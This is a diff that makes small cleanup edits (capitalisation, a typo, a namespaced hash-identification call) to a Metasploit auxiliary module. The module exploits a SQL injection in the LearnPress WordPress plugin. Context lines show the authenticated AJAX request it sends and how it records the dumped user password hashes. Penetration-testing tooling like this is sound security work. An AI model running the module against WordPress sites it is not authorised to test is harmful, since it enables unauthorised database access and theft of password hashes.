@@ -8,8 +8,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::SQLi
 
-  require 'metasploit/framework/hashes/identify'
-
   def initialize(info = {})
     super(
       update_info(
@@ -60,10 +58,10 @@ class MetasploitModule < Msf::Auxiliary
 
     checkcode = check_plugin_version_from_readme('learnpress', '3.2.6.8')
     if checkcode == Msf::Exploit::CheckCode::Safe
-      vprint_error('Learnpress version not vulnerable')
+      vprint_error('LearnPress version not vulnerable')
       return
     end
-    print_good('Vulnerable version detected')
+    print_good('Vulnerable version of LearnPress detected')
 
     cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])
 
@@ -83,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
         'vars_post' => {
           'type' => 'lp_course',
           'context' => 'order-items',
-          'context_id' => Rex::Text.rand_text_numeric(2, 0), # avoid 0s incase leading 0 gives bad results
+          'context_id' => Rex::Text.rand_text_numeric(2, 0), # avoid 0s in case leading 0 gives bad results
           'term' => Rex::Text.rand_text_alpha(8),
           'paged' => 1,
           'lp-ajax' => 'modal_search_items',
@@ -110,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         username: user[0],
         private_type: :nonreplayable_hash,
-        jtr_format: identify_hash(user[1]),
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
         private_data: user[1],
         service_name: 'Wordpress',
         address: ip,
